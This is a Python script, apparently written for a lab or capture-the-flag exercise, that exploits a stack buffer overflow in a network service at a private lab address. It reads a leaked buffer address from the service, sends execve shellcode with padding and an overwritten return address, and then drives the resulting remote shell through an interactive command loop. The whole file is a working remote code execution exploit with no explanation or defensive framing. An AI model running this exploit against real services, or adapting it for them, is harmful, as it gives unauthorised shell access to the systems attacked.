import struct
import socket
import time


HOST = '192.168.56.103'
PORT = 4321

SHELLCODE = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'



def read(sock) :
    received = sock.recv(1024)
    return received.decode()


def create_msg(buf_start_addr, shellcode) :
    padding = b'\x41' * (140 - len(shellcode))
    eip = struct.pack("<Q", buf_start_addr) # Litte endian unsigned long long (8 bytes)
    return shellcode + padding + eip + b'\x0a' # \x0a = \n


def start_shell(sock) :
    print("Starting shell")
    while True :
        command = input("$ ") + ";\n"

        if command == "stop;\n" :
            break

        sock.send(command.encode())

        while True :
            try :
                sock.settimeout(2.0)
                print(read(sock))
            except Exception :
                break

    sock.close()


def hack(host, port, shellcode) :
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    print("Connected")

    first = read(sock)
    print("Received : ", first)
    buf_start_addr = int(first.split()[0], 0)
    msg = create_msg(buf_start_addr, shellcode)

    print("Created msg : ", msg)
    n = sock.send(msg)
    print("Msg sent")

    start_shell(sock)



hack(HOST, PORT, SHELLCODE)








